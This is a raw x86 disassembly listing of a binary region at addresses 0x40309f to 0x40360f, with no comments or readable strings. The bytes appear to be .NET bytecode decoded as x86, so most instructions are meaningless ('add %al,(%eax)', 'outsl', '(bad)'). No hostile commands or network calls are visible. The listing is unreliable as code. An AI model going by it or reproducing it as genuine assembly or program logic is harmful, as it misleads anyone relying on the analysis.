  40309f:	86 00                	xchg   %al,(%eax)
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	08 6f 83             	or     %ch,-0x7d(%edi)
  4030a6:	00 00                	add    %al,(%eax)
  4030a8:	0a 0d 00 09 72 f7    	or     0xf7720900,%cl
  4030ae:	03 00                	add    (%eax),%eax
  4030b0:	70 6f                	jo     0x403121
  4030b2:	84 00                	test   %al,(%eax)
  4030b4:	00 0a                	add    %cl,(%edx)
  4030b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b7:	33 00                	xor    (%eax),%eax
  4030b9:	00 0a                	add    %cl,(%edx)
  4030bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bc:	7e 00                	jle    0x4030be
  4030be:	00 0a                	add    %cl,(%edx)
  4030c0:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4030c3:	04 72                	add    $0x72,%al
  4030c5:	11 04 00             	adc    %eax,(%eax,%eax,1)
  4030c8:	70 28                	jo     0x4030f2
  4030ca:	1f                   	pop    %ds
  4030cb:	00 00                	add    %al,(%eax)
  4030cd:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  4030d0:	09 72 3d             	or     %esi,0x3d(%edx)
  4030d3:	04 00                	add    $0x0,%al
  4030d5:	70 6f                	jo     0x403146
  4030d7:	84 00                	test   %al,(%eax)
  4030d9:	00 0a                	add    %cl,(%edx)
  4030db:	6f                   	outsl  %ds:(%esi),(%dx)
  4030dc:	33 00                	xor    (%eax),%eax
  4030de:	00 0a                	add    %cl,(%edx)
  4030e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e1:	85 00                	test   %eax,(%eax)
  4030e3:	00 0a                	add    %cl,(%edx)
  4030e5:	72 49                	jb     0x403130
  4030e7:	04 00                	add    $0x0,%al
  4030e9:	70 6f                	jo     0x40315a
  4030eb:	7f 00                	jg     0x4030ed
  4030ed:	00 0a                	add    %cl,(%edx)
  4030ef:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  4030f4:	59                   	pop    %ecx
  4030f5:	04 00                	add    $0x0,%al
  4030f7:	70 6f                	jo     0x403168
  4030f9:	7f 00                	jg     0x4030fb
  4030fb:	00 0a                	add    %cl,(%edx)
  4030fd:	2d 1c 09 72 3d       	sub    $0x3d72091c,%eax
  403102:	04 00                	add    $0x0,%al
  403104:	70 6f                	jo     0x403175
  403106:	84 00                	test   %al,(%eax)
  403108:	00 0a                	add    %cl,(%edx)
  40310a:	6f                   	outsl  %ds:(%esi),(%dx)
  40310b:	33 00                	xor    (%eax),%eax
  40310d:	00 0a                	add    %cl,(%edx)
  40310f:	72 67                	jb     0x403178
  403111:	04 00                	add    $0x0,%al
  403113:	70 28                	jo     0x40313d
  403115:	1f                   	pop    %ds
  403116:	00 00                	add    %al,(%eax)
  403118:	0a 2b                	or     (%ebx),%ch
  40311a:	01 17                	add    %edx,(%edi)
  40311c:	13 05 11 05 2c 06    	adc    0x62c0511,%eax
  403122:	00 17                	add    %dl,(%edi)
  403124:	13 06                	adc    (%esi),%eax
  403126:	de 42 00             	fiadds 0x0(%edx)
  403129:	08 6f 86             	or     %ch,-0x7a(%edi)
  40312c:	00 00                	add    %al,(%eax)
  40312e:	0a 3a                	or     (%edx),%bh
  403130:	6f                   	outsl  %ds:(%esi),(%dx)
  403131:	ff                   	(bad)
  403132:	ff                   	(bad)
  403133:	ff                   	lcall  (bad)
  403134:	de 0b                	fimuls (%ebx)
  403136:	08 2c 07             	or     %ch,(%edi,%eax,1)
  403139:	08 6f 2d             	or     %ch,0x2d(%edi)
  40313c:	00 00                	add    %al,(%eax)
  40313e:	0a 00                	or     (%eax),%al
  403140:	dc 00                	faddl  (%eax)
  403142:	de 0b                	fimuls (%ebx)
  403144:	07                   	pop    %es
  403145:	2c 07                	sub    $0x7,%al
  403147:	07                   	pop    %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40314e:	dc 00                	faddl  (%eax)
  403150:	de 0b                	fimuls (%ebx)
  403152:	06                   	push   %es
  403153:	2c 07                	sub    $0x7,%al
  403155:	06                   	push   %es
  403156:	6f                   	outsl  %ds:(%esi),(%dx)
  403157:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40315c:	dc 00                	faddl  (%eax)
  40315e:	de 05 26 00 00 de    	fiadds 0xde000026
  403164:	00 16                	add    %dl,(%esi)
  403166:	13 06                	adc    (%esi),%eax
  403168:	2b 00                	sub    (%eax),%eax
  40316a:	11 06                	adc    %eax,(%esi)
  40316c:	2a 00                	sub    (%eax),%al
  40316e:	00 00                	add    %al,(%eax)
  403170:	01 34 00             	add    %esi,(%eax,%eax,1)
  403173:	00 02                	add    %al,(%edx)
  403175:	00 1e                	add    %bl,(%esi)
  403177:	00 98 b6 00 0b 00    	add    %bl,0xb00b6(%eax)
  40317d:	00 00                	add    %al,(%eax)
  40317f:	00 02                	add    %al,(%edx)
  403181:	00 15 00 af c4 00    	add    %dl,0xc4af00
  403187:	0b 00                	or     (%eax),%eax
  403189:	00 00                	add    %al,(%eax)
  40318b:	00 02                	add    %al,(%edx)
  40318d:	00 0d 00 c5 d2 00    	add    %cl,0xd2c500
  403193:	0b 00                	or     (%eax),%eax
  403195:	00 00                	add    %al,(%eax)
  403197:	00 00                	add    %al,(%eax)
  403199:	00 01                	add    %al,(%ecx)
  40319b:	00 df                	add    %bl,%bh
  40319d:	e0 00                	loopne 0x40319f
  40319f:	05 0f 00 00 01       	add    $0x100000f,%eax
  4031a4:	1b 30                	sbb    (%eax),%esi
  4031a6:	02 00                	add    (%eax),%al
  4031a8:	22 00                	and    (%eax),%al
  4031aa:	00 00                	add    %al,(%eax)
  4031ac:	0a 00                	or     (%eax),%al
  4031ae:	00 11                	add    %dl,(%ecx)
  4031b0:	00 16                	add    %dl,(%esi)
  4031b2:	0a 00                	or     (%eax),%al
  4031b4:	28 56 00             	sub    %dl,0x0(%esi)
  4031b7:	00 0a                	add    %cl,(%edx)
  4031b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ba:	87 00                	xchg   %eax,(%eax)
  4031bc:	00 0a                	add    %cl,(%edx)
  4031be:	12 00                	adc    (%eax),%al
  4031c0:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4031c3:	00 06                	add    %al,(%esi)
  4031c5:	26 06                	es push %es
  4031c7:	0b de                	or     %esi,%ebx
  4031c9:	06                   	push   %es
  4031ca:	26 00 06             	add    %al,%es:(%esi)
  4031cd:	0b de                	or     %esi,%ebx
  4031cf:	00 07                	add    %al,(%edi)
  4031d1:	2a 00                	sub    (%eax),%al
  4031d3:	00 01                	add    %al,(%ecx)
  4031d5:	10 00                	adc    %al,(%eax)
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	00 03                	add    %al,(%ebx)
  4031db:	00 17                	add    %dl,(%edi)
  4031dd:	1a 00                	sbb    (%eax),%al
  4031df:	06                   	push   %es
  4031e0:	0f 00 00             	sldt   (%eax)
  4031e3:	01 1b                	add    %ebx,(%ebx)
  4031e5:	30 02                	xor    %al,(%edx)
  4031e7:	00 2b                	add    %ch,(%ebx)
  4031e9:	00 00                	add    %al,(%eax)
  4031eb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4031ee:	00 11                	add    %dl,(%ecx)
  4031f0:	00 00                	add    %al,(%eax)
  4031f2:	72 7d                	jb     0x403271
  4031f4:	04 00                	add    $0x0,%al
  4031f6:	70 28                	jo     0x403220
  4031f8:	3b 00                	cmp    (%eax),%eax
  4031fa:	00 06                	add    %al,(%esi)
  4031fc:	0b 12                	or     (%edx),%edx
  4031fe:	01 28                	add    %ebp,(%eax)
  403200:	88 00                	mov    %al,(%eax)
  403202:	00 0a                	add    %cl,(%edx)
  403204:	16                   	push   %ss
  403205:	fe 03                	incb   (%ebx)
  403207:	0a 06                	or     (%esi),%al
  403209:	2c 04                	sub    $0x4,%al
  40320b:	17                   	pop    %ss
  40320c:	0c de                	or     $0xde,%al
  40320e:	0a 16                	or     (%esi),%dl
  403210:	0c de                	or     $0xde,%al
  403212:	06                   	push   %es
  403213:	26 00 16             	add    %dl,%es:(%esi)
  403216:	0c de                	or     $0xde,%al
  403218:	00 08                	add    %cl,(%eax)
  40321a:	2a 00                	sub    (%eax),%al
  40321c:	01 10                	add    %edx,(%eax)
  40321e:	00 00                	add    %al,(%eax)
  403220:	00 00                	add    %al,(%eax)
  403222:	01 00                	add    %eax,(%eax)
  403224:	22 23                	and    (%ebx),%ah
  403226:	00 06                	add    %al,(%esi)
  403228:	0f 00 00             	sldt   (%eax)
  40322b:	01 22                	add    %esp,(%edx)
  40322d:	02 28                	add    (%eax),%ch
  40322f:	14 00                	adc    $0x0,%al
  403231:	00 0a                	add    %cl,(%edx)
  403233:	00 2a                	add    %ch,(%edx)
  403235:	00 00                	add    %al,(%eax)
  403237:	00 1b                	add    %bl,(%ebx)
  403239:	30 04 00             	xor    %al,(%eax,%eax,1)
  40323c:	62 00                	bound  %eax,(%eax)
  40323e:	00 00                	add    %al,(%eax)
  403240:	0d 00 00 11 00       	or     $0x110000,%eax
  403245:	00 1b                	add    %bl,(%ebx)
  403247:	8d 0f                	lea    (%edi),%ecx
  403249:	00 00                	add    %al,(%eax)
  40324b:	01 25 16 28 89 00    	add    %esp,0x892816
  403251:	00 0a                	add    %cl,(%edx)
  403253:	8c 71 00             	mov    %?,0x0(%ecx)
  403256:	00 01                	add    %al,(%ecx)
  403258:	a2 25 17 28 8a       	mov    %al,0x8a281725
  40325d:	00 00                	add    %al,(%eax)
  40325f:	0a a2 25 18 28 8b    	or     -0x74d7e7db(%edx),%ah
  403265:	00 00                	add    %al,(%eax)
  403267:	0a a2 25 19 28 8c    	or     -0x73d7e6db(%edx),%ah
  40326d:	00 00                	add    %al,(%eax)
  40326f:	0a a2 25 1a 28 78    	or     0x78281a25(%edx),%ah
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	79 00                	jns    0x40327b
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	73 7a                	jae    0x4032f9
  40327f:	00 00                	add    %al,(%eax)
  403281:	0a 28                	or     (%eax),%ch
  403283:	7b 00                	jnp    0x403285
  403285:	00 0a                	add    %cl,(%edx)
  403287:	8c 5f 00             	mov    %ds,0x0(%edi)
  40328a:	00 01                	add    %al,(%ecx)
  40328c:	a2 28 8d 00 00       	mov    %al,0x8d28
  403291:	0a 28                	or     (%eax),%ch
  403293:	2f                   	das
  403294:	00 00                	add    %al,(%eax)
  403296:	06                   	push   %es
  403297:	0a de                	or     %dh,%bl
  403299:	0a 26                	or     (%esi),%ah
  40329b:	00 72 95             	add    %dh,-0x6b(%edx)
  40329e:	04 00                	add    $0x0,%al
  4032a0:	70 0a                	jo     0x4032ac
  4032a2:	de 00                	fiadds (%eax)
  4032a4:	06                   	push   %es
  4032a5:	2a 00                	sub    (%eax),%al
  4032a7:	00 01                	add    %al,(%ecx)
  4032a9:	10 00                	adc    %al,(%eax)
  4032ab:	00 00                	add    %al,(%eax)
  4032ad:	00 01                	add    %al,(%ecx)
  4032af:	00 55 56             	add    %dl,0x56(%ebp)
  4032b2:	00 0a                	add    %cl,(%edx)
  4032b4:	0f 00 00             	sldt   (%eax)
  4032b7:	01 13                	add    %edx,(%ebx)
  4032b9:	30 03                	xor    %al,(%ebx)
  4032bb:	00 69 00             	add    %ch,0x0(%ecx)
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	0e                   	push   %cs
  4032c1:	00 00                	add    %al,(%eax)
  4032c3:	11 00                	adc    %eax,(%eax)
  4032c5:	73 8e                	jae    0x403255
  4032c7:	00 00                	add    %al,(%eax)
  4032c9:	0a 0a                	or     (%edx),%cl
  4032cb:	28 8f 00 00 0a 02    	sub    %cl,0x20a0000(%edi)
  4032d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d2:	18 00                	sbb    %al,(%eax)
  4032d4:	00 0a                	add    %cl,(%edx)
  4032d6:	0b 06                	or     (%esi),%eax
  4032d8:	07                   	pop    %es
  4032d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4032da:	90                   	nop
  4032db:	00 00                	add    %al,(%eax)
  4032dd:	0a 0b                	or     (%ebx),%cl
  4032df:	73 91                	jae    0x403272
  4032e1:	00 00                	add    %al,(%eax)
  4032e3:	0a 0c 00             	or     (%eax,%eax,1),%cl
  4032e6:	07                   	pop    %es
  4032e7:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4032ec:	1f                   	pop    %ds
  4032ed:	09 11                	or     %edx,(%ecx)
  4032ef:	04 91                	add    $0x91,%al
  4032f1:	13 05 08 12 05 72    	adc    0x72051208,%eax
  4032f7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4032f8:	04 00                	add    $0x0,%al
  4032fa:	70 28                	jo     0x403324
  4032fc:	92                   	xchg   %eax,%edx
  4032fd:	00 00                	add    %al,(%eax)
  4032ff:	0a 6f 93             	or     -0x6d(%edi),%ch
  403302:	00 00                	add    %al,(%eax)
  403304:	0a 26                	or     (%esi),%ah
  403306:	11 04 17             	adc    %eax,(%edi,%edx,1)
  403309:	58                   	pop    %eax
  40330a:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40330d:	04 09                	add    $0x9,%al
  40330f:	8e 69 32             	mov    0x32(%ecx),%gs
  403312:	da 08                	fimull (%eax)
  403314:	6f                   	outsl  %ds:(%esi),(%dx)
  403315:	33 00                	xor    (%eax),%eax
  403317:	00 0a                	add    %cl,(%edx)
  403319:	16                   	push   %ss
  40331a:	1f                   	pop    %ds
  40331b:	14 6f                	adc    $0x6f,%al
  40331d:	94                   	xchg   %eax,%esp
  40331e:	00 00                	add    %al,(%eax)
  403320:	0a 6f 95             	or     -0x6b(%edi),%ch
  403323:	00 00                	add    %al,(%eax)
  403325:	0a 13                	or     (%ebx),%dl
  403327:	06                   	push   %es
  403328:	2b 00                	sub    (%eax),%eax
  40332a:	11 06                	adc    %eax,(%esi)
  40332c:	2a 00                	sub    (%eax),%al
  40332e:	00 00                	add    %al,(%eax)
  403330:	13 30                	adc    (%eax),%esi
  403332:	06                   	push   %es
  403333:	00 c4                	add    %al,%ah
  403335:	01 00                	add    %eax,(%eax)
  403337:	00 0f                	add    %cl,(%edi)
  403339:	00 00                	add    %al,(%eax)
  40333b:	11 00                	adc    %eax,(%eax)
  40333d:	73 4d                	jae    0x40338c
  40333f:	00 00                	add    %al,(%eax)
  403341:	0a 0a                	or     (%edx),%cl
  403343:	06                   	push   %es
  403344:	72 d1                	jb     0x403317
  403346:	01 00                	add    %eax,(%eax)
  403348:	70 6f                	jo     0x4033b9
  40334a:	4e                   	dec    %esi
  40334b:	00 00                	add    %al,(%eax)
  40334d:	0a 72 ad             	or     -0x53(%edx),%dh
  403350:	04 00                	add    $0x0,%al
  403352:	70 6f                	jo     0x4033c3
  403354:	4f                   	dec    %edi
  403355:	00 00                	add    %al,(%eax)
  403357:	0a 00                	or     (%eax),%al
  403359:	06                   	push   %es
  40335a:	72 c3                	jb     0x40331f
  40335c:	04 00                	add    $0x0,%al
  40335e:	70 6f                	jo     0x4033cf
  403360:	4e                   	dec    %esi
  403361:	00 00                	add    %al,(%eax)
  403363:	0a 7e 10             	or     0x10(%esi),%bh
  403366:	00 00                	add    %al,(%eax)
  403368:	04 6f                	add    $0x6f,%al
  40336a:	4f                   	dec    %edi
  40336b:	00 00                	add    %al,(%eax)
  40336d:	0a 00                	or     (%eax),%al
  40336f:	06                   	push   %es
  403370:	72 cd                	jb     0x40333f
  403372:	04 00                	add    $0x0,%al
  403374:	70 6f                	jo     0x4033e5
  403376:	4e                   	dec    %esi
  403377:	00 00                	add    %al,(%eax)
  403379:	0a 28                	or     (%eax),%ch
  40337b:	8a 00                	mov    (%eax),%al
  40337d:	00 0a                	add    %cl,(%edx)
  40337f:	6f                   	outsl  %ds:(%esi),(%dx)
  403380:	33 00                	xor    (%eax),%eax
  403382:	00 0a                	add    %cl,(%edx)
  403384:	6f                   	outsl  %ds:(%esi),(%dx)
  403385:	4f                   	dec    %edi
  403386:	00 00                	add    %al,(%eax)
  403388:	0a 00                	or     (%eax),%al
  40338a:	06                   	push   %es
  40338b:	72 d7                	jb     0x403364
  40338d:	04 00                	add    $0x0,%al
  40338f:	70 6f                	jo     0x403400
  403391:	4e                   	dec    %esi
  403392:	00 00                	add    %al,(%eax)
  403394:	0a 73 7c             	or     0x7c(%ebx),%dh
  403397:	00 00                	add    %al,(%eax)
  403399:	0a 28                	or     (%eax),%ch
  40339b:	7d 00                	jge    0x40339d
  40339d:	00 0a                	add    %cl,(%edx)
  40339f:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a0:	33 00                	xor    (%eax),%eax
  4033a2:	00 0a                	add    %cl,(%edx)
  4033a4:	72 dd                	jb     0x403383
  4033a6:	04 00                	add    $0x0,%al
  4033a8:	70 14                	jo     0x4033be
  4033aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ab:	96                   	xchg   %eax,%esi
  4033ac:	00 00                	add    %al,(%eax)
  4033ae:	0a 72 f1             	or     -0xf(%edx),%dh
  4033b1:	04 00                	add    $0x0,%al
  4033b3:	70 28                	jo     0x4033dd
  4033b5:	97                   	xchg   %eax,%edi
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	0a 0b                	or     (%ebx),%cl
  4033ba:	12 01                	adc    (%ecx),%al
  4033bc:	28 98 00 00 0a 72    	sub    %bl,0x720a0000(%eax)
  4033c2:	f5                   	cmc
  4033c3:	04 00                	add    $0x0,%al
  4033c5:	70 72                	jo     0x403439
  4033c7:	ff 04 00             	incl   (%eax,%eax,1)
  4033ca:	70 6f                	jo     0x40343b
  4033cc:	96                   	xchg   %eax,%esi
  4033cd:	00 00                	add    %al,(%eax)
  4033cf:	0a 72 0b             	or     0xb(%edx),%dh
  4033d2:	05 00 70 72 17       	add    $0x17727000,%eax
  4033d7:	05 00 70 6f 96       	add    $0x966f7000,%eax
  4033dc:	00 00                	add    %al,(%eax)
  4033de:	0a 28                	or     (%eax),%ch
  4033e0:	40                   	inc    %eax
  4033e1:	00 00                	add    %al,(%eax)
  4033e3:	0a 6f 4f             	or     0x4f(%edi),%ch
  4033e6:	00 00                	add    %al,(%eax)
  4033e8:	0a 00                	or     (%eax),%al
  4033ea:	06                   	push   %es
  4033eb:	72 23                	jb     0x403410
  4033ed:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  4033f2:	00 00                	add    %al,(%eax)
  4033f4:	0a 28                	or     (%eax),%ch
  4033f6:	99                   	cltd
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	0a 6f 4f             	or     0x4f(%edi),%ch
  4033fc:	00 00                	add    %al,(%eax)
  4033fe:	0a 00                	or     (%eax),%al
  403400:	06                   	push   %es
  403401:	72 2d                	jb     0x403430
  403403:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403408:	00 00                	add    %al,(%eax)
  40340a:	0a 7e 03             	or     0x3(%esi),%bh
  40340d:	00 00                	add    %al,(%eax)
  40340f:	04 6f                	add    $0x6f,%al
  403411:	4f                   	dec    %edi
  403412:	00 00                	add    %al,(%eax)
  403414:	0a 00                	or     (%eax),%al
  403416:	06                   	push   %es
  403417:	72 3d                	jb     0x403456
  403419:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  40341e:	00 00                	add    %al,(%eax)
  403420:	0a 28                	or     (%eax),%ch
  403422:	31 00                	xor    %eax,(%eax)
  403424:	00 06                	add    %al,(%esi)
  403426:	0b 12                	or     (%edx),%edx
  403428:	01 28                	add    %ebp,(%eax)
  40342a:	98                   	cwtl
  40342b:	00 00                	add    %al,(%eax)
  40342d:	0a 6f 7e             	or     0x7e(%edi),%ch
  403430:	00 00                	add    %al,(%eax)
  403432:	0a 72 49             	or     0x49(%edx),%dh
  403435:	05 00 70 72 3d       	add    $0x3d727000,%eax
  40343a:	05 00 70 6f 96       	add    $0x966f7000,%eax
  40343f:	00 00                	add    %al,(%eax)
  403441:	0a 72 47             	or     0x47(%edx),%dh
  403444:	00 00                	add    %al,(%eax)
  403446:	70 72                	jo     0x4034ba
  403448:	cd 04                	int    $0x4
  40344a:	00 70 6f             	add    %dh,0x6f(%eax)
  40344d:	96                   	xchg   %eax,%esi
  40344e:	00 00                	add    %al,(%eax)
  403450:	0a 6f 4f             	or     0x4f(%edi),%ch
  403453:	00 00                	add    %al,(%eax)
  403455:	0a 00                	or     (%eax),%al
  403457:	06                   	push   %es
  403458:	72 53                	jb     0x4034ad
  40345a:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  40345f:	00 00                	add    %al,(%eax)
  403461:	0a 28                	or     (%eax),%ch
  403463:	36 00 00             	add    %al,%ss:(%eax)
  403466:	06                   	push   %es
  403467:	6f                   	outsl  %ds:(%esi),(%dx)
  403468:	4f                   	dec    %edi
  403469:	00 00                	add    %al,(%eax)
  40346b:	0a 00                	or     (%eax),%al
  40346d:	06                   	push   %es
  40346e:	72 6b                	jb     0x4034db
  403470:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403475:	00 00                	add    %al,(%eax)
  403477:	0a 7e 0e             	or     0xe(%esi),%bh
  40347a:	00 00                	add    %al,(%eax)
  40347c:	04 6f                	add    $0x6f,%al
  40347e:	4f                   	dec    %edi
  40347f:	00 00                	add    %al,(%eax)
  403481:	0a 00                	or     (%eax),%al
  403483:	06                   	push   %es
  403484:	72 7d                	jb     0x403503
  403486:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  40348b:	00 00                	add    %al,(%eax)
  40348d:	0a 28                	or     (%eax),%ch
  40348f:	33 00                	xor    (%eax),%eax
  403491:	00 06                	add    %al,(%esi)
  403493:	6f                   	outsl  %ds:(%esi),(%dx)
  403494:	4f                   	dec    %edi
  403495:	00 00                	add    %al,(%eax)
  403497:	0a 00                	or     (%eax),%al
  403499:	06                   	push   %es
  40349a:	72 91                	jb     0x40342d
  40349c:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  4034a1:	00 00                	add    %al,(%eax)
  4034a3:	0a 28                	or     (%eax),%ch
  4034a5:	99                   	cltd
  4034a6:	00 00                	add    %al,(%eax)
  4034a8:	0a 73 55             	or     0x55(%ebx),%dh
  4034ab:	00 00                	add    %al,(%eax)
  4034ad:	0a 28                	or     (%eax),%ch
  4034af:	9a 00 00 0a 0c 12 02 	lcall  $0x212,$0xc0a0000
  4034b6:	28 9b 00 00 0a 0c    	sub    %bl,0xc0a0000(%ebx)
  4034bc:	12 02                	adc    (%edx),%al
  4034be:	28 9c 00 00 0a 6f 4f 	sub    %bl,0x4f6f0a00(%eax,%eax,1)
  4034c5:	00 00                	add    %al,(%eax)
  4034c7:	0a 00                	or     (%eax),%al
  4034c9:	06                   	push   %es
  4034ca:	72 a5                	jb     0x403471
  4034cc:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  4034d1:	00 00                	add    %al,(%eax)
  4034d3:	0a 72 3b             	or     0x3b(%edx),%dh
  4034d6:	01 00                	add    %eax,(%eax)
  4034d8:	70 6f                	jo     0x403549
  4034da:	4f                   	dec    %edi
  4034db:	00 00                	add    %al,(%eax)
  4034dd:	0a 00                	or     (%eax),%al
  4034df:	06                   	push   %es
  4034e0:	72 af                	jb     0x403491
  4034e2:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  4034e7:	00 00                	add    %al,(%eax)
  4034e9:	0a 7e 12             	or     0x12(%esi),%bh
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	04 6f                	add    $0x6f,%al
  4034f0:	4f                   	dec    %edi
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	0a 00                	or     (%eax),%al
  4034f5:	06                   	push   %es
  4034f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4034f7:	51                   	push   %ecx
  4034f8:	00 00                	add    %al,(%eax)
  4034fa:	0a 0d 2b 00 09 2a    	or     0x2a09002b,%cl
  403500:	13 30                	adc    (%eax),%esi
  403502:	02 00                	add    (%eax),%al
  403504:	1a 00                	sbb    (%eax),%al
  403506:	00 00                	add    %al,(%eax)
  403508:	02 00                	add    (%eax),%al
  40350a:	00 11                	add    %dl,(%ecx)
  40350c:	00 28                	add    %ch,(%eax)
  40350e:	9d                   	popf
  40350f:	00 00                	add    %al,(%eax)
  403511:	0a 73 9e             	or     -0x62(%ebx),%dh
  403514:	00 00                	add    %al,(%eax)
  403516:	0a 20                	or     (%eax),%ah
  403518:	20 02                	and    %al,(%edx)
  40351a:	00 00                	add    %al,(%eax)
  40351c:	6f                   	outsl  %ds:(%esi),(%dx)
  40351d:	9f                   	lahf
  40351e:	00 00                	add    %al,(%eax)
  403520:	0a 0a                	or     (%edx),%cl
  403522:	2b 00                	sub    (%eax),%eax
  403524:	06                   	push   %es
  403525:	2a 00                	sub    (%eax),%al
  403527:	00 1b                	add    %bl,(%ebx)
  403529:	30 02                	xor    %al,(%edx)
  40352b:	00 51 00             	add    %dl,0x0(%ecx)
  40352e:	00 00                	add    %al,(%eax)
  403530:	02 00                	add    (%eax),%al
  403532:	00 11                	add    %dl,(%ecx)
  403534:	00 00                	add    %al,(%eax)
  403536:	7e 0f                	jle    0x403547
  403538:	00 00                	add    %al,(%eax)
  40353a:	04 28                	add    $0x28,%al
  40353c:	13 00                	adc    (%eax),%eax
  40353e:	00 0a                	add    %cl,(%edx)
  403540:	2c 07                	sub    $0x7,%al
  403542:	28 31                	sub    %dh,(%ecx)
  403544:	00 00                	add    %al,(%eax)
  403546:	06                   	push   %es
  403547:	2b 01                	sub    (%ecx),%eax
  403549:	16                   	push   %ss
  40354a:	0a 06                	or     (%esi),%al
  40354c:	2c 06                	sub    $0x6,%al
  40354e:	28 41 00             	sub    %al,0x0(%ecx)
  403551:	00 06                	add    %al,(%esi)
  403553:	00 28                	add    %ch,(%eax)
  403555:	38 00                	cmp    %al,(%eax)
  403557:	00 06                	add    %al,(%esi)
  403559:	00 28                	add    %ch,(%eax)
  40355b:	08 00                	or     %al,(%eax)
  40355d:	00 06                	add    %al,(%esi)
  40355f:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  403564:	06                   	push   %es
  403565:	6f                   	outsl  %ds:(%esi),(%dx)
  403566:	a0 00 00 0a 00       	mov    0xa0000,%al
  40356b:	28 06                	sub    %al,(%esi)
  40356d:	00 00                	add    %al,(%eax)
  40356f:	06                   	push   %es
  403570:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  403575:	06                   	push   %es
  403576:	28 a1 00 00 0a 00    	sub    %ah,0xa0000(%ecx)
  40357c:	00 de                	add    %bl,%dh
  40357e:	05 26 00 00 de       	add    $0xde000026,%eax
  403583:	00 2a                	add    %ch,(%edx)
  403585:	00 00                	add    %al,(%eax)
  403587:	00 01                	add    %al,(%ecx)
  403589:	10 00                	adc    %al,(%eax)
  40358b:	00 00                	add    %al,(%eax)
  40358d:	00 01                	add    %al,(%ecx)
  40358f:	00 4a 4b             	add    %cl,0x4b(%edx)
  403592:	00 05 0f 00 00 01    	add    %al,0x100000f
  403598:	1b 30                	sbb    (%eax),%esi
  40359a:	03 00                	add    (%eax),%eax
  40359c:	b1 00                	mov    $0x0,%cl
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	10 00                	adc    %al,(%eax)
  4035a2:	00 11                	add    %dl,(%ecx)
  4035a4:	00 00                	add    %al,(%eax)
  4035a6:	72 bb                	jb     0x403563
  4035a8:	05 00 70 28 8b       	add    $0x8b287000,%eax
  4035ad:	00 00                	add    %al,(%eax)
  4035af:	0a 72 c1             	or     -0x3f(%edx),%dh
  4035b2:	05 00 70 28 40       	add    $0x40287000,%eax
  4035b7:	00 00                	add    %al,(%eax)
  4035b9:	0a 72 ed             	or     -0x13(%edx),%dh
  4035bc:	05 00 70 73 a2       	add    $0xa2737000,%eax
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	0a 0a                	or     (%edx),%cl
  4035c5:	00 73 a3             	add    %dh,-0x5d(%ebx)
  4035c8:	00 00                	add    %al,(%eax)
  4035ca:	0a 0b                	or     (%ebx),%cl
  4035cc:	00 06                	add    %al,(%esi)
  4035ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4035cf:	81 00 00 0a 6f 82    	addl   $0x826f0a00,(%eax)
  4035d5:	00 00                	add    %al,(%eax)
  4035d7:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  4035da:	20 08                	and    %cl,(%eax)
  4035dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4035dd:	83 00 00             	addl   $0x0,(%eax)
  4035e0:	0a 0d 00 07 09 72    	or     0x72090700,%cl
  4035e6:	2b 06                	sub    (%esi),%eax
  4035e8:	00 70 6f             	add    %dh,0x6f(%eax)
  4035eb:	84 00                	test   %al,(%eax)
  4035ed:	00 0a                	add    %cl,(%edx)
  4035ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f0:	33 00                	xor    (%eax),%eax
  4035f2:	00 0a                	add    %cl,(%edx)
  4035f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4035f6:	00 00                	add    %al,(%eax)
  4035f8:	0a 00                	or     (%eax),%al
  4035fa:	00 08                	add    %cl,(%eax)
  4035fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4035fd:	86 00                	xchg   %al,(%eax)
  4035ff:	00 0a                	add    %cl,(%edx)
  403601:	2d d8 de 0b 08       	sub    $0x80bded8,%eax
  403606:	2c 07                	sub    $0x7,%al
  403608:	08 6f 2d             	or     %ch,0x2d(%edi)
  40360b:	00 00                	add    %al,(%eax)
  40360d:	0a 00                	or     (%eax),%al
  40360f:	dc 07                	faddl  (%edi)
